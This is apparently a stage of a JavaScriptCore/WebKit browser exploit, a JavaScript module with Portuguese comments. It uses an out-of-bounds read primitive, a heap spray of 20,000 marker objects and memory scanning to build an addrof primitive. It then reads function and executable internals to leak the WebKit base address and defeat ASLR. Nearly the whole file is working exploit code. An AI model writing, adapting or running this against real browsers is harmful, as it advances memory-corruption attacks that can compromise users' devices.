// js/script3/testArrayBufferVictimCrash.mjs (R48 - Addrof via Varredura OOB & Heap Spray - FINAL)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read, // Essencial para esta estratégia
    getOOBDataView,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

// CORRIGIDO: Simplificar o nome da constante exportada para evitar erros de digitação
export const FNAME_MODULE = "WebKit_Exploit_R48_OOBScanAddrof";

// Parâmetros do Spray e Scan
const SPRAY_SIZE = 20000;
const SPRAY_MARKER_BIGINT = 0x4545454546464646n; // Novo marcador único
const HEAP_SCAN_RANGE_BYTES = 0x800000; // 8MB
const HEAP_SCAN_STEP = 0x8;
const OOB_SCAN_WINDOW_BYTES = 0x200000; // 2MB

// Offsets para WebKit Leak
const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

function isValidPointer(ptr, context = "") {
    if (!isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) return false;
    if (high >= 0x80000000) return false; // Excluir ponteiros de kernel/altos
    if (high === 0x7FF80000 && low === 0x0) return false;
    if ((high & 0x7FF00000) === 0x7FF00000) return false;
    if (high === 0 && low < 0x10000) return false;
    return true;
}
function safeToHex(value, length = 8) {
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    try { return toHex(value); } catch (e) { return String(value); }
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R48() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Addrof via Varredura OOB & Heap Spray ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init OOBScan...`;

    logS3(`--- Fase 0 (OOBScan): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);
    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed" }; }

    let result = {
        errorOccurred: null,
        addrof_result: { success: false, msg: "Addrof (OOBScan): Não obtido.", leaked_object_addr: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (OOBScan): Não iniciado.", webkit_base_candidate: null },
    };

    try {
        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        if (!isOOBReady() || typeof arb_read !== 'function') {
            throw new Error("Falha ao preparar ambiente OOB ou a primitiva arb_read não está disponível.");
        }

        // --- Fase 1: Encontrar um ponteiro de heap inicial via Varredura OOB ---
        logS3(`--- Fase 1 (OOBScan): Procurando por um ponteiro de heap na janela OOB ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const oob_view = getOOBDataView();
        if (!oob_view) throw new Error("getOOBDataView() não retornou uma view válida.");

        let initial_heap_ptr = null;
        logS3(`   Varrendo os primeiros ${OOB_SCAN_WINDOW_BYTES / 1024} KB da janela OOB...`, 'info');
        for (let offset = 0; offset < OOB_SCAN_WINDOW_BYTES; offset += 4) {
            try {
                const low = oob_view.getUint32(offset, true);
                const high = oob_view.getUint32(offset + 4, true);
                const potential_ptr = new AdvancedInt64(low, high);
                if (isValidPointer(potential_ptr, "_oobScan")) {
                    initial_heap_ptr = potential_ptr;
                    break;
                }
            } catch (e) { /* Ignorar erros de leitura se houver */ }
        }

        if (!initial_heap_ptr) {
            throw new Error("Nenhum ponteiro de heap válido encontrado na janela OOB. Impossível continuar.");
        }
        logS3(`   Ponteiro de heap inicial encontrado: ${initial_heap_ptr.toString(true)}`, "good");

        // --- Fase 2: Construir a primitiva ADDROF via Heap Spray & Scan com arb_read ---
        logS3(`--- Fase 2 (OOBScan): Construindo ADDROF via Heap Spray & Scan ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        
        const target_function_for_addrof = function someUniqueLeakFunctionR48_SprayTarget() {};
        
        logS3(`   Pulverizando a memória com ${SPRAY_SIZE} objetos marcadores...`, "info");
        const spray_array = new Array(SPRAY_SIZE);
        for (let i = 0; i < SPRAY_SIZE; i++) {
            spray_array[i] = { marker: SPRAY_MARKER_BIGINT, target: target_function_for_addrof };
        }
        logS3(`   Spray concluído.`, "good");

        logS3(`   Iniciando varredura com arb_read em torno de ${initial_heap_ptr.toString(true)}...`, "info");
        let found_marker_at = null;
        for (let offset = -HEAP_SCAN_RANGE_BYTES; offset <= HEAP_SCAN_RANGE_BYTES; offset += HEAP_SCAN_STEP) {
            const current_scan_addr = initial_heap_ptr.add(new AdvancedInt64(offset));
            try {
                const val64 = await arb_read(current_scan_addr, 8);
                if (val64 && val64.toBigInt() === SPRAY_MARKER_BIGINT) {
                    found_marker_at = current_scan_addr;
                    logS3(`   !!! MARCADOR ENCONTRADO EM ${found_marker_at.toString(true)} !!!`, "success_major");
                    break;
                }
            } catch (e) { /* ignorar erros */ }
        }

        if (!found_marker_at) {
            throw new Error("Marcador do spray não encontrado na memória. Tente aumentar SPRAY_SIZE ou HEAP_SCAN_RANGE_BYTES.");
        }
        
        const target_object_pointer_addr = found_marker_at.add(new AdvancedInt64(8));
        const leaked_target_addr = await arb_read(target_object_pointer_addr, 8);
        if (!isValidPointer(leaked_target_addr, "_leakedFinalAddr")) {
            throw new Error(`Ponteiro lido para o objeto alvo é inválido: ${safeToHex(leaked_target_addr)}`);
        }

        logS3(`   !!! ADDROF(target_function_for_addrof) = ${leaked_target_addr.toString(true)} !!!`, "success_major");
        result.addrof_result = { success: true, msg: "addrof obtido via Varredura OOB e Heap Spray.", leaked_object_addr: leaked_target_addr.toString(true) };
        
        // --- Fase 3: Usar a primitiva ADDROF para vazar a base do WebKit ---
        logS3(`--- Fase 3 (OOBScan): Usando addrof para vazar o endereço base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        
        const addr_of_target_func = leaked_target_addr;
        const ptr_exe = await arb_read(addr_of_target_func.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
        if (!isValidPointer(ptr_exe, "_wkLeakExeSpray")) throw new Error("Ponteiro para Executable inválido.");
        logS3(`   Ponteiro para Executable Instance = ${ptr_exe.toString(true)}`, "leak_detail");

        const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
        if (!isValidPointer(ptr_jitvm, "_wkLeakJitVmSpray")) throw new Error("Ponteiro para JIT Code/VM inválido.");
        logS3(`   Ponteiro para JIT Code/VM = ${ptr_jitvm.toString(true)}`, "leak_detail");

        const webkit_base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
        logS3(`   !!! ENDEREÇO BASE DO WEBKIT (CANDIDATO): ${webkit_base_candidate.toString(true)} !!!`, "success_major");

        result.webkit_leak_result = { success: true, msg: `WebKitLeak OK: ${webkit_base_candidate.toString(true)}`, webkit_base_candidate: webkit_base_candidate.toString(true) };
        document.title = `${FNAME_CURRENT_TEST_BASE} Final: WEBKIT_LEAK_OK!`;

    } catch(e) {
        logS3(`   ERRO na execução do exploit: ${e.message}`, "critical");
        result.errorOccurred = e.message;
        document.title = `${FNAME_CURRENT_TEST_BASE} Final: FAILED`;
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }

    return result;
}
